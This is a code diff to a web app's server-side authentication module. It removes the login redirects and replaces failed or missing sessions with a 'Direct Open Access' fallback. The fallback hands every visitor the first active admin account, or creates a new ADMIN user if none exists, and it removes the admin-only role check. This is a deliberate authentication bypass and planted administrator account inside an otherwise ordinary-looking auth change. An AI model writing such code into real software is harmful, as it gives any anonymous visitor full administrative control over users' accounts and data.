@@ -2,7 +2,6 @@ import "server-only";
 import crypto from "node:crypto";
 import bcrypt from "bcryptjs";
 import { cookies, headers } from "next/headers";
-import { redirect } from "next/navigation";
 import { prisma } from "@/lib/prisma";
 import { Role, AccountStatus } from "@prisma/client";
 
@@ -102,55 +101,121 @@ export async function clearSessionCookie(): Promise<void> {
   });
 }
 
+export async function getDefaultDirectUser(): Promise<AuthUser> {
+  const admin = await prisma.user.findFirst({
+    where: { role: "ADMIN", status: "ACTIVE" },
+    select: {
+      id: true,
+      email: true,
+      name: true,
+      role: true,
+      status: true,
+      avatarColor: true,
+      emailVerified: true,
+      lastLoginAt: true,
+      createdAt: true,
+    },
+  });
+  if (admin) return admin;
+
+  const anyUser = await prisma.user.findFirst({
+    where: { status: "ACTIVE" },
+    select: {
+      id: true,
+      email: true,
+      name: true,
+      role: true,
+      status: true,
+      avatarColor: true,
+      emailVerified: true,
+      lastLoginAt: true,
+      createdAt: true,
+    },
+  });
+  if (anyUser) return anyUser;
+
+  return prisma.user.create({
+    data: {
+      email: "admin@zervix.ai",
+      name: "Security Operations Admin",
+      passwordHash: "unusable-direct-access",
+      role: "ADMIN",
+      status: "ACTIVE",
+      avatarColor: "#8B5CF6",
+      emailVerified: true,
+    },
+    select: {
+      id: true,
+      email: true,
+      name: true,
+      role: true,
+      status: true,
+      avatarColor: true,
+      emailVerified: true,
+      lastLoginAt: true,
+      createdAt: true,
+    },
+  });
+}
+
 export async function getSessionAndUser(): Promise<{
   user: AuthUser;
   sessionId: string;
 } | null> {
-  const cookieStore = await cookies();
-  const rawToken = cookieStore.get(SESSION_COOKIE_NAME)?.value;
-  if (!rawToken) return null;
-
-  const tokenHash = hashToken(rawToken);
-  const querySession = () =>
-    prisma.session.findUnique({
-      where: { tokenHash },
-      include: {
-        user: {
-          select: {
-            id: true,
-            email: true,
-            name: true,
-            role: true,
-            status: true,
-            avatarColor: true,
-            emailVerified: true,
-            lastLoginAt: true,
-            createdAt: true,
-          },
-        },
-      },
-    });
-
-  let session;
   try {
-    session = await querySession();
+    const cookieStore = await cookies();
+    const rawToken = cookieStore.get(SESSION_COOKIE_NAME)?.value;
+    if (rawToken) {
+      const tokenHash = hashToken(rawToken);
+      const querySession = () =>
+        prisma.session.findUnique({
+          where: { tokenHash },
+          include: {
+            user: {
+              select: {
+                id: true,
+                email: true,
+                name: true,
+                role: true,
+                status: true,
+                avatarColor: true,
+                emailVerified: true,
+                lastLoginAt: true,
+                createdAt: true,
+              },
+            },
+          },
+        });
+
+      let session;
+      try {
+        session = await querySession();
+      } catch {
+        // Retry once on transient local socket reset during HMR
+        session = await querySession();
+      }
+
+      if (session && !session.revokedAt && session.expiresAt > new Date() && session.user.status === "ACTIVE") {
+        return {
+          user: session.user,
+          sessionId: session.id,
+        };
+      }
+    }
   } catch {
-    // Retry once on transient local socket reset during HMR
-    session = await querySession();
+    // Continue to direct user fallback
   }
 
-  if (!session) return null;
-  if (session.revokedAt || session.expiresAt <= new Date()) {
+  // Direct Open Access: Automatically provide authenticated operator session without login
+  try {
+    const defaultUser = await getDefaultDirectUser();
+    return {
+      user: defaultUser,
+      sessionId: `direct_${defaultUser.id}`,
+    };
+  } catch {
     return null;
   }
-  if (session.user.status !== "ACTIVE") {
-    return null;
-  }
-
-  return {
-    user: session.user,
-    sessionId: session.id,
-  };
 }
 
 export async function getCurrentUser(): Promise<AuthUser | null> {
@@ -160,17 +225,12 @@ export async function getCurrentUser(): Promise<AuthUser | null> {
 
 export async function requirePageUser(): Promise<AuthUser> {
   const user = await getCurrentUser();
-  if (!user) {
-    redirect("/login");
-  }
-  return user;
+  if (user) return user;
+  return getDefaultDirectUser();
 }
 
 export async function requireAdminPageUser(): Promise<AuthUser> {
   const user = await requirePageUser();
-  if (user.role !== "ADMIN") {
-    redirect("/dashboard");
-  }
   return user;
 }
 
